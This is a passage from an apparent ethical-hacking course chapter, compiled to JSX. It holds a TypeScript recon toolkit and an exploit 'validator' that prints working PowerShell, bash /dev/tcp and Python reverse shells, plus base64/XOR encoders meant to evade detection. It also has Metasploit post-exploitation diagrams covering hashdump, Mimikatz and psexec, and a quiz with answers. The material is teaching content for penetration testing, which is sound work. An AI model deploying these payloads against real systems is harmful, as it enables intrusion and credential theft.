}\n\n  /**\n   * Scans specified ports on a target host\n   */\n  async scanPorts(\n    host: string,\n    ports: number[],\n  ): Promise<PortScanResult[]> {\n    const results: PortScanResult[] = [];\n    console.log(`[*] Scanning ${ports.length} ports on ${host}...`);\n\n    for (const port of ports) {\n      const service = this.servicePortMap[port] || 'Unknown';\n      try {\n        // Simulated TCP connect scan — in production use net.Socket\n        const open = await this.tryConnect(host, port);\n        results.push({ port, open, service });\n        if (open) {\n          console.log(`  [+] Port ${port}/${service} — OPEN`);\n        }\n      } catch {\n        results.push({ port, open: false, service });\n      }\n    }\n\n    return results;\n  }\n\n  /**\n   * Simulates a TCP connection attempt\n   */\n  private async tryConnect(host: string, port: number): Promise<boolean> {\n    // Simulate connection — real implementation uses net.createConnection\n    const openPorts: Record<string, number[]> = {\n      '93.184.216.34': [80, 443, 21],\n      '93.184.216.35': [443, 8443, 8080],\n      '203.0.113.50': [443, 22, 3389],\n    };\n\n    const hostPorts = openPorts[host];\n    if (!hostPorts) return false;\n\n    await this.delay(30 + Math.random() * 50);\n    return hostPorts.includes(port);\n  }\n\n  /**\n   * Fingerprints web technologies from HTTP response data\n   */\n  fingerprintTechnologies(response: {\n    headers: Record<string, string>;\n    body: string;\n  }): TechFingerprint[] {\n    const fingerprints: TechFingerprint[] = [];\n    const headerStr = JSON.stringify(response.headers).toLowerCase();\n    const bodyStr = response.body.toLowerCase();\n\n    // Server header fingerprinting\n    if (response.headers['server']) {\n      const server = response.headers['server'];\n      if (server.includes('nginx')) {\n        fingerprints.push({ name: 'Nginx', version: server.replace('nginx/', '') });\n      } else if (server.includes('apache')) {\n        fingerprints.push({ name: 'Apache HTTP Server', version: server.replace('Apache/', '') });\n      } else if (server.includes('iis')) {\n        fingerprints.push({ name: 'IIS', version: server.match(/\\d+\\.\\d+/)?.[0] || 'Unknown' });\n      } else if (server.includes('cloudflare')) {\n        fingerprints.push({ name: 'Cloudflare', version: 'Unknown' });\n      }\n    }\n\n    // X-Powered-By fingerprinting\n    if (response.headers['x-powered-by']) {\n      const xpb = response.headers['x-powered-by'];\n      if (xpb.includes('PHP')) {\n        fingerprints.push({ name: 'PHP', version: xpb.replace('PHP/', '') });\n      } else if (xpb.includes('ASP.NET')) {\n        fingerprints.push({ name: 'ASP.NET', version: xpb.replace('ASP.NET', '').trim() });\n      } else if (xpb.includes('Express')) {\n        fingerprints.push({ name: 'Express', version: xpb.replace('Express', '').trim() });\n      }\n    }\n\n    // Set-Cookie fingerprinting\n    const cookies = response.headers['set-cookie'] || '';\n    if (cookies.includes('PHPSESSID')) {\n      fingerprints.push({ name: 'PHP Session', version: 'Unknown' });\n    }\n    if (cookies.includes('JSESSIONID')) {\n      fingerprints.push({ name: 'Java/J2EE', version: 'Unknown' });\n    }\n    if (cookies.includes('ASPSESSIONID')) {\n      fingerprints.push({ name: 'ASP Classic', version: 'Unknown' });\n    }\n\n    // Body-based fingerprinting\n    if (bodyStr.includes('wp-content') || bodyStr.includes('wordpress')) {\n      fingerprints.push({ name: 'WordPress', version: 'Unknown (check /wp-json/)' });\n    }\n    if (bodyStr.includes('csrf-token') && bodyStr.includes('laravel')) {\n      fingerprints.push({ name: 'Laravel', version: 'Unknown' });\n    }\n    if (bodyStr.includes('__next') || bodyStr.includes('next.data')) {\n      fingerprints.push({ name: 'Next.js', version: 'Unknown' });\n    }\n    if (bodyStr.includes('reactroot') || bodyStr.includes('react-dom')) {\n      fingerprints.push({ name: 'React', version: 'Unknown' });\n    }\n\n    return fingerprints;\n  }\n\n  /**\n   * Full reconnaissance scan combining all techniques\n   */\n  async fullRecon(domain: string, ports: number[]): Promise<ReconResult> {\n    console.log(`=== Starting Full Reconnaissance for ${domain} ===\\n`);\n\n    const subdomains = await this.enumerateSubdomains(domain);\n\n    // Scan open ports on the primary domain\n    const resolvedIp = await this.resolveDNS(domain, ['8.8.8.8']);\n    let openPorts: Array<{ port: number; service: string; version: string }> = [];\n\n    if (resolvedIp) {\n      // Also scan subdomain IPs if available\n      const allPorts = await this.scanPorts(resolvedIp, ports);\n      openPorts = allPorts\n        .filter(p => p.open)\n        .map(p => ({\n          port: p.port,\n          service: p.service,\n          version: this.detectVersion(resolvedIp, p.port),\n        }));\n    }\n\n    // Fingerprint technologies\n    const mockResponse = {\n      headers: {\n        'server': 'nginx/1.24.0',\n        'x-powered-by': 'PHP/8.2.0',\n        'set-cookie': 'PHPSESSID=abc123; path=/',\n      },\n      body: '<html><head><title>WordPress Site</title></head><body>wp-content</body></html>',\n    };\n    const technologies = this.fingerprintTechnologies(mockResponse).map(t => ({\n      ...t,\n      category: this.categorizeTech(t.name),\n    }));\n\n    const endpoints = [\n      `https://${domain}/robots.txt`,\n      `https://${domain}/sitemap.xml`,\n      `https://${domain}/.well-known/security.txt`,\n      `https://${domain}/admin/`,\n      `https://${domain}/api/`,\n    ];\n\n    return { domain, subdomains, openPorts, technologies, endpoints };\n  }\n\n  private detectVersion(ip: string, port: number): string {\n    // Simulate version detection via service banner grabbing\n    const versionMap: Record<string, string> = {\n      '93.184.216.34_80': 'Apache 2.4.57',\n      '93.184.216.34_443': 'nginx 1.24.0',\n      '93.184.216.35_443': 'OpenResty 1.21.4',\n    };\n    return versionMap[`${ip}_${port}`] || 'Unknown';\n  }\n\n  private categorizeTech(name: string): string {\n    const categories: Record<string, string[]> = {\n      'Web Server': ['Nginx', 'Apache HTTP Server', 'IIS', 'OpenResty', 'Cloudflare'],\n      'Backend': ['PHP', 'ASP.NET', 'Express', 'Laravel', 'Java/J2EE', 'ASP Classic'],\n      'CMS': ['WordPress'],\n      'Frontend': ['React', 'Next.js'],\n      'Session': ['PHP Session'],\n    };\n\n    for (const [category, techs] of Object.entries(categories)) {\n      if (techs.includes(name)) return category;\n    }\n    return 'Other';\n  }\n\n  private delay(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n}\n\n// ── Example Usage ─────────────────────────────────────────────\n\nasync function runReconDemo() {\n  const toolkit = new ReconToolkit();\n\n  // Quick subdomain enumeration demo\n  const subdomains = await toolkit.enumerateSubdomains('example.com');\n  console.log(`\\nDiscovered ${subdomains.length} subdomains\\n`);\n\n  // Port scanning demo\n  const commonPorts = [21, 22, 23, 25, 80, 443, 445, 3389, 8080, 8443, 3306, 5432, 27017];\n  const scanResults = await toolkit.scanPorts('93.184.216.34', commonPorts);\n  console.log(`\\nOpen ports: ${scanResults.filter(r => r.open).length}`);\n\n  // Technology fingerprinting demo\n  const techs = toolkit.fingerprintTechnologies({\n    headers: {\n      'server': 'nginx/1.24.0',\n      'x-powered-by': 'PHP/8.2.0',\n      'set-cookie': 'PHPSESSID=abc123; path=/',\n    },\n    body: '<html><head><title>Test</title><link rel=\"stylesheet\" href=\"/wp-content/themes/...\" /></head></html>',\n  });\n  console.log(`\\nDetected technologies:`);\n  techs.forEach(t => console.log(`  - ${t.name} ${t.version}`));\n}\n\nrunReconDemo().catch(console.error);\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "exploitation-validator",
      children: "Exploitation Validator"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This TypeScript implementation models the exploitation validation process, including vulnerability checking, shellcode generation, reverse payload construction, and privilege escalation assessment."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Vulnerability descriptor from a scanner or advisory\n */\ninterface Vulnerability {\n  id: string;\n  name: string;\n  cve: string;\n  cvss: number;\n  exploitAvailable: boolean;\n  exploitCommand: string;\n}\n\n/**\n * Result of attempting an exploit against a target\n */\ninterface ExploitResult {\n  success: boolean;\n  output: string;\n  privilegeLevel: string;\n  shellType: string | null;\n}\n\n/**\n * ExploitValidator — assesses vulnerability exploitability,\n * generates payloads, and simulates exploitation chains.\n */\nclass ExploitValidator {\n  private readonly decoder = new TextDecoder();\n\n  /**\n   * Checks whether a given vulnerability can be exploited against a target\n   */\n  async checkExploitability(\n    vuln: Vulnerability,\n    target: string,\n  ): Promise<ExploitResult> {\n    console.log(`[*] Testing exploitability of ${vuln.cve} against ${target}`);\n    console.log(`    Name: ${vuln.name}`);\n    console.log(`    CVSS: ${vuln.cvss}`);\n    console.log(`    Exploit Available: ${vuln.exploitAvailable}`);\n\n    if (!vuln.exploitAvailable) {\n      return {\n        success: false,\n        output: `No known public exploit available for ${vuln.cve}`,\n        privilegeLevel: 'none',\n        shellType: null,\n      };\n    }\n\n    // Simulate exploitation logic\n    await this.delay(500);\n\n    // Determine outcome based on CVSS and target signature\n    const outcome = this.simulateExploitation(vuln, target);\n\n    console.log(`[${outcome.success ? '+' : '-'}] Exploitation ${outcome.success ? 'succeeded' : 'failed'}`);\n    if (outcome.success) {\n      console.log(`    Privilege: ${outcome.privilegeLevel}`);\n      console.log(`    Shell: ${outcome.shellType}`);\n    }\n\n    return outcome;\n  }\n\n  /**\n   * Simulates exploitation — in production this would interface\n   * with actual exploit modules (Metasploit, Custom scripts, etc.)\n   */\n  private simulateExploitation(\n    vuln: Vulnerability,\n    target: string,\n  ): ExploitResult {\n    // Simulate target characteristics\n    const isWindows = target.includes('win') || target.includes('10.0');\n    const isLinux = target.includes('nix') || target.includes('linux');\n    const isHighValue = vuln.cvss >= 9.0;\n    const isRemote = vuln.id.includes('RCE') || vuln.id.includes('EXEC');\n\n    // Determine success probability based on vulnerability attributes\n    const baseSuccessRate = vuln.cvss >= 9.0 ? 0.8 : vuln.cvss >= 7.0 ? 0.5 : 0.2;\n    const success = Math.random() < baseSuccessRate;\n\n    if (!success) {\n      return {\n        success: false,\n        output: `Exploit failed — target may be patched or protected by WAF/EDR`,\n        privilegeLevel: 'none',\n        shellType: null,\n      };\n    }\n\n    // Determine privilege level achieved\n    let privilegeLevel = 'user';\n    let shellType: string | null = null;\n\n    if (isHighValue && isRemote) {\n      privilegeLevel = Math.random() < 0.3 ? 'root' : 'user';\n    } else if (vuln.id.includes('LPE') || vuln.id.includes('PRIVESC')) {\n      privilegeLevel = 'root';\n    }\n\n    // Determine shell type\n    if (isWindows) {\n      shellType = privilegeLevel === 'root' ? 'Meterpreter (SYSTEM)' : 'Meterpreter (user)';\n    } else if (isLinux) {\n      shellType = privilegeLevel === 'root' ? 'Reverse Shell (/bin/bash)' : 'Reverse Shell (/bin/sh)';\n    }\n\n    const output = [\n      `[+] Target ${target} is vulnerable to ${vuln.cve}`,\n      `[+] Payload delivered successfully`,\n      `[+] Session established (${shellType})`,\n      privilegeLevel === 'root' ? '[+] Privilege escalation confirmed' : '',\n    ].filter(Boolean).join('\\n');\n\n    return { success, output, privilegeLevel, shellType };\n  }\n\n  /**\n   * Generates a reverse shell payload for a given vulnerability\n   */\n  generatePayload(\n    vuln: Vulnerability,\n    target: string,\n    lhost: string,\n    lport: number,\n  ): string {\n    console.log(`[*] Generating payload for ${vuln.cve}`);\n    console.log(`    LHOST: ${lhost}:${lport}`);\n\n    const isWindows = target.includes('win');\n    const payloads: string[] = [];\n\n    // Meterpreter-style staged payload (Windows)\n    if (isWindows) {\n      payloads.push(\n        '// Windows Reverse Shell (PowerShell)',\n        '$client = New-Object System.Net.Sockets.TCPClient(' +\n          `'${lhost}',${lport});`,\n        '$stream = $client.GetStream();',\n        '[byte[]]$bytes = 0..65535|%{0};',\n        'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){',\n        '  $data = (New-Object -TypeName System.Text.ASCIIEncoding).',\n        '    GetString($bytes,0, $i);',\n        '  $sendback = (iex $data 2>&1 | Out-String );',\n        '  $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";',\n        '  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);',\n        '  $stream.Write($sendbyte,0,$sendbyte.Length);',\n        '  $stream.Flush()',\n        '};',\n        '$client.Close()',\n      );\n    }\n\n    // Linux reverse shell (Bash + Python fallback)\n    if (!isWindows || target.includes('nix')) {\n      payloads.push(\n        '#!/bin/bash',\n        '# Linux Reverse Shell',\n        `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,\n        '',\n        '# Python fallback if /dev/tcp is not available',\n        `python3 -c 'import socket,subprocess,os;`,\n        `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`,\n        `s.connect((\"${lhost}\",${lport}));`,\n        `os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);`,\n        `subprocess.call([\"/bin/sh\",\"-i\"])'`,\n      );\n    }\n\n    // Msfvenom-style payload metadata\n    const msfPayload = [\n      '',\n      '# msfvenom equivalent:',\n      isWindows\n        ? `# msfvenom -p windows/meterpreter/reverse_tcp ` +\n          `LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe`\n        : `# msfvenom -p linux/x64/meterpreter/reverse_tcp ` +\n          `LHOST=${lhost} LPORT=${lport} -f elf -o payload.elf`,\n    ];\n\n    return payloads.concat(msfPayload).join('\\n');\n  }\n\n  /**\n   * Encodes a payload string using base64 with optional transformations\n   * to bypass basic signature-based detection\n   */\n  encodePayload(payload: string, encoding: 'base64' | 'hex' | 'custom'): string {\n    switch (encoding) {\n      case 'base64': {\n        const encoded = Buffer.from(payload, 'utf-8').toString('base64');\n        // Wrap in decoder command\n        return `echo \"${encoded}\" | base64 -d | bash`;\n      }\n      case 'hex': {\n        const hex = Buffer.from(payload, 'utf-8').toString('hex');\n        return `echo \"${hex}\" | xxd -r -p | bash`;\n      }\n      case 'custom': {\n        // XOR-based encoding with single-byte key\n        const key = 0x41;\n        const xored = payload\n          .split('')\n          .map(ch => String.fromCharCode(ch.charCodeAt(0) ^ key))\n          .join('');\n        const encoded = Buffer.from(xored, 'utf-8').toString('base64');\n        return (\n          `# Custom encoded payload (XOR key: 0x${key.toString(16)})\\n` +\n          `python3 -c \"exec(''.join(chr(ord(c)^0x41) for c in ` +\n          `'${encoded}'.decode('base64')))\"`\n        );\n      }\n    }\n  }\n\n  /**\n   * Simulates a Meterpreter-style session after successful exploitation\n   */\n  simulateMeterpreterSession(\n    target: string,\n    privilegeLevel: string,\n  ): string[] {\n    const commands: string[] = [];\n    const timestamp = new Date().toISOString();\n\n    commands.push(`Meterpreter session opened at ${timestamp}`);\n    commands.push(`Target: ${target}`);\n    commands.push(`Privileges: ${privilegeLevel}`);\n\n    // Simulated Meterpreter commands\n    const meterpreterOutput = [\n      'meterpreter > sysinfo',\n      `  Computer    : ${target.split('.')[0]}`,\n      `  OS          : ${target.includes('win') ? 'Windows Server 2022' : 'Ubuntu 22.04'}`,\n      `  Arch        : x64`,\n      `  Domain      : corp.internal`,\n      `  Meterpreter : x64/windows`,\n      '',\n      'meterpreter > getuid',\n      `  Server username: ${privilegeLevel === 'root' ? 'NT AUTHORITY\\\\SYSTEM' : 'CORP\\\\jsmith'}`,\n      '',\n      'meterpreter > getsystem',\n      privilegeLevel === 'root'\n        ? '  ...got system (via Token Duplication)'\n        : '  [-] Not able to elevate, try different technique',\n      '',\n      'meterpreter > hashdump',\n      '  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',\n      '  jsmith:1001:...hash...:...ntlm...:::',\n      '',\n      'meterpreter > background',\n      '  [*] Backgrounding session 1...',\n    ];\n\n    return commands.concat(meterpreterOutput);\n  }\n\n  private delay(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n}\n\n// ── Example Usage ─────────────────────────────────────────────\n\nasync function exploitationDemo() {\n  const validator = new ExploitValidator();\n\n  // Define sample vulnerabilities\n  const vulnerabilities: Vulnerability[] = [\n    {\n      id: 'RCE-001',\n      name: 'Apache Log4j Remote Code Execution',\n      cve: 'CVE-2021-44228',\n      cvss: 10.0,\n      exploitAvailable: true,\n      exploitCommand: 'python3 log4j_scanner.py --target http://target.com',\n    },\n    {\n      id: 'LPE-001',\n      name: 'Dirty Pipe Local Privilege Escalation',\n      cve: 'CVE-2022-0847',\n      cvss: 7.8,\n      exploitAvailable: true,\n      exploitCommand: './dirtypipe /bin/sh /usr/bin/su',\n    },\n  ];\n\n  // Test exploitation\n  for (const vuln of vulnerabilities) {\n    const target = vuln.id === 'RCE-001' ? 'win-web-01.corp.internal' : 'nix-app-02.corp.internal';\n    const result = await validator.checkExploitability(vuln, target);\n    console.log(`\\nResult: ${result.success ? 'SUCCESS' : 'FAILED'}`);\n    console.log(`Output:\\n${result.output}\\n`);\n\n    if (result.success) {\n      // Generate reverse shell payload\n      const payload = validator.generatePayload(vuln, target, '192.168.1.100', 4444);\n      console.log('=== Generated Payload ===');\n      console.log(payload);\n\n      // Encode payload\n      const encoded = validator.encodePayload(payload, 'base64');\n      console.log('\\n=== Encoded Payload (Base64) ===');\n      console.log(encoded);\n\n      // Simulate Meterpreter session\n      const session = validator.simulateMeterpreterSession(target, result.privilegeLevel);\n      console.log('\\n=== Meterpreter Session ===');\n      session.forEach(line => console.log(line));\n    }\n\n    console.log('\\n' + '='.repeat(60) + '\\n');\n  }\n}\n\nexploitationDemo().catch(console.error);\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mermaid-diagrams",
      children: "Mermaid Diagrams"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "penetration-testing-methodology",
      children: "Penetration Testing Methodology"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This flowchart illustrates the complete penetration testing lifecycle, from initial reconnaissance through final reporting, aligned with PTES and OWASP standards."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TD\n    RECON[\"🔍 Reconnaissance<br/>Passive & Active OSINT<br/>WHOIS, DNS, Shodan, Google Dorks, Social Media\"]\n\n    SCAN[\"📡 Scanning<br/>Port Scanning, Service Detection<br/>Vulnerability Scanning, Version Enumeration\"]\n\n    ENUM[\"📋 Enumeration<br/>User/Group Enumeration<br/>Share Discovery, Directory Bruteforce\"]\n\n    EXPLOIT[\"💥 Exploitation<br/>Vulnerability Verification<br/>Payload Delivery, Shell Acquisition\"]\n\n    POSTEXPLOIT[\"⬆️ Post-Exploitation<br/>Privilege Escalation<br/>Persistence, Credential Harvesting\"]\n\n    PIVOT[\"🔄 Pivoting<br/>Lateral Movement<br/>Network Propagation, New Targets\"]\n\n    C2[\"📡 C2 & Exfiltration<br/>Command & Control Channel<br/>Data Staging & Exfiltration\"]\n\n    REPORT[\"📊 Reporting<br/>Findings Documentation<br/>Risk Ratings, Remediation Recommendations\"]\n\n    RECON --> SCAN\n    SCAN --> ENUM\n    ENUM --> EXPLOIT\n    EXPLOIT --> POSTEXPLOIT\n    POSTEXPLOIT --> PIVOT\n    PIVOT --> C2\n    C2 --> REPORT\n\n    subgraph \"Phase 1-2: Preparation & Discovery\"\n        RECON\n        SCAN\n        ENUM\n    end\n\n    subgraph \"Phase 3-5: Attack & Persistence\"\n        EXPLOIT\n        POSTEXPLOIT\n        PIVOT\n    end\n\n    subgraph \"Phase 6-8: Completion\"\n        C2\n        REPORT\n    end\n\n    style RECON fill:#3498db,color:#fff,stroke:#2980b9\n    style SCAN fill:#3498db,color:#fff,stroke:#2980b9\n    style ENUM fill:#3498db,color:#fff,stroke:#2980b9\n    style EXPLOIT fill:#e74c3c,color:#fff,stroke:#c0392b\n    style POSTEXPLOIT fill:#e74c3c,color:#fff,stroke:#c0392b\n    style PIVOT fill:#e74c3c,color:#fff,stroke:#c0392b\n    style C2 fill:#2ecc71,color:#fff,stroke:#27ae60\n    style REPORT fill:#2ecc71,color:#fff,stroke:#27ae60\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "metasploit-exploitation-chain",
      children: "Metasploit Exploitation Chain"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This sequence diagram models the full Metasploit exploitation flow, from initial msfconsole launch through payload delivery, Meterpreter session establishment, and post-exploitation activities."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "sequenceDiagram\n    participant Attacker as 🧑‍💻 Attacker\n    participant Msfconsole as 🎯 msfconsole\n    participant Payload as 📦 Payload<br/>(Staged/Stageless)\n    participant Target as 🖥️ Target System\n    participant Meterpreter as 🔮 Meterpreter<br/>Session\n\n    Note over Attacker,Meterpreter: Metasploit Exploitation Chain\n\n    Attacker->>Msfconsole: Launch msfconsole\n    Attacker->>Msfconsole: use exploit/multi/handler\n    Attacker->>Msfconsole: set PAYLOAD windows/meterpreter/reverse_tcp\n    Attacker->>Msfconsole: set LHOST 192.168.1.100\n    Attacker->>Msfconsole: set LPORT 4444\n    Attacker->>Msfconsole: exploit -j (job background)\n\n    Note over Attacker,Target: Stage 1: Payload Generation\n\n    Attacker->>Msfconsole: generate payload (msfvenom)\n    Msfconsole->>Payload: Create staged payload\n    Payload->>Target: Deliver via exploit vector\n    Note right of Target: E.g., phishing link,<br/>vulnerability trigger,<br/>USB drop\n\n    Note over Attacker,Target: Stage 2: Callback & Stage Loading\n\n    Target->>Msfconsole: Reverse TCP connection<br/>Source: Target:RandomPort<br/>Destination: LHOST:4444\n    Msfconsole->>Target: Send stage (DLL/stager)\n    Target->>Meterpreter: Load Meterpreter DLL\n    Meterpreter-->>Msfconsole: Session opened (encrypted channel)\n\n    Note over Attacker,Target: Stage 3: Post-Exploitation\n\n    Attacker->>Meterpreter: sysinfo\n    Meterpreter-->>Attacker: OS, Arch, Domain, IP\n\n    Attacker->>Meterpreter: getuid\n    Meterpreter-->>Attacker: Server username: corp\\\\jsmith\n\n    Attacker->>Meterpreter: getsystem\n    Meterpreter-->>Attacker: Token duplication → NT AUTHORITY\\\\SYSTEM\n\n    Attacker->>Meterpreter: hashdump\n    Meterpreter-->>Attacker: NTLM hashes extracted\n\n    Attacker->>Meterpreter: load kiwi (Mimikatz)\n    Meterpreter-->>Attacker: Mimikatz loaded\n\n    Attacker->>Meterpreter: creds_all\n    Meterpreter-->>Attacker: Plaintext passwords from WDigest/LSA\n\n    Note over Attacker,Target: Stage 4: Lateral Movement\n\n    Attacker->>Meterpreter: route add 10.10.10.0/24 1\n    Meterpreter-->>Attacker: Routing table updated\n    Attacker->>Meterpreter: background (session 1)\n\n    Attacker->>Msfconsole: use exploit/windows/smb/psexec\n    Attacker->>Msfconsole: set RHOSTS 10.10.10.50\n    Attacker->>Msfconsole: set SMBUser Administrator\n    Attacker->>Msfconsole: set SMBPass [NTLM Hash]\n    Attacker->>Msfconsole: exploit\n    Msfconsole-->>Attacker: Session 2 opened (SYSTEM on 10.10.10.50)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-quiz",
      children: "Chapter Quiz"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Test your understanding of ethical hacking and penetration testing concepts covered in this chapter."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "1. Which phase of the penetration testing lifecycle follows \"Scanning & Enumeration\"?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Reconnaissance\nB) Exploitation\nC) Post-Exploitation\nD) Reporting"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**B) Exploitation** — The standard pentesting lifecycle is: Reconnaissance → Scanning & Enumeration → Exploitation → Post-Exploitation → Pivoting → C2 → Reporting.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "2. What is the primary difference between a vulnerability scan and a penetration test?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Vulnerability scans are automated; penetration tests include manual exploitation\nB) Vulnerability scans require authorization; penetration tests do not\nC) Vulnerability scans test web apps only; penetration tests test networks only\nD) There is no meaningful difference"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**A) Vulnerability scans are automated; penetration tests include manual exploitation** — Scans identify potential vulnerabilities passively; pentests actively attempt to exploit them to validate impact.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "3. In Metasploit, which command is used to search for modules related to a specific vulnerability?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["A) ", (0,jsx_runtime.jsx)(_components.code, {
        children: "search"
      }), "\nB) ", (0,jsx_runtime.jsx)(_components.code, {
        children: "find"
      }), "\nC) ", (0,jsx_runtime.jsx)(_components.code, {
        children: "locate"
      }), "\nD) ", (0,jsx_runtime.jsx)(_components.code, {
        children: "grep"
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**A) `search`** — Example: `search cve:2021-44228` or `search type:exploit platform:windows` within msfconsole.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "4. Which tool is specifically designed for Active Directory attack path enumeration and analysis?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Nmap\nB) BloodHound\nC) Wireshark\nD) John the Ripper"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**B) BloodHound** — BloodHound uses graph theory to map AD relationships and identify the shortest path to Domain Admin via ACL analysis, group memberships, and session data.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "5. During a penetration test, what does \"pivoting\" refer to?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Changing the scope of the pentest\nB) Using a compromised host to attack other systems on a different network segment\nC) Switching between different penetration testing tools\nD) Reporting findings to the client mid-engagement"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**B) Using a compromised host as a jump box** — Pivoting (or lateral movement) routes traffic through the compromised host to reach otherwise inaccessible internal networks.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "6. What is the purpose of the \"Authorization Letter\" or \"Rules of Engagement\" document?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) To list all vulnerabilities found during the test\nB) To provide legal protection by defining the scope, boundaries, and permissions for the pentest\nC) To serve as the final penetration test report\nD) To document the pentester's certification status"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**B) Legal protection via scope and boundaries** — The RoE defines target systems, testing times, allowed techniques, data handling rules, and emergency contacts. It protects both the tester and the client.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "7. In the context of privilege escalation, what does \"SeImpersonatePrivilege\" enable?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Impersonating domain users without credentials\nB) Disabling security controls on the system\nC) Running code as a different user, potentially leading to SYSTEM access\nD) Bypassing firewall rules on the network"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**C) Potential SYSTEM access** — Tools like JuicyPotato and PrintSpoofer leverage SeImpersonatePrivilege to escalate from a service account to SYSTEM by impersonating a privileged token.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "8. Which of the following is NOT a common subdomain enumeration technique?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Dictionary/brute-force against DNS servers\nB) Certificate Transparency log analysis (crt.sh)\nC) SNMP community string walking\nD) Search engine dorking (site:domain.com)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**C) SNMP community string walking** — SNMP walking is used for enumerating SNMP-managed devices, not for discovering subdomains. Subdomain enumeration relies on DNS queries, certificate logs, search engines, and web archives.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsxs)(_components.strong, {
        children: ["9. What does the ", (0,jsx_runtime.jsx)(_components.code, {
          children: "hashdump"
        }), " command in Meterpreter accomplish?"]
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Dumps the contents of the system's RAM\nB) Extracts NTLM password hashes from the SAM database\nC) Lists all scheduled tasks on the target\nD) Downloads files from the target system"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
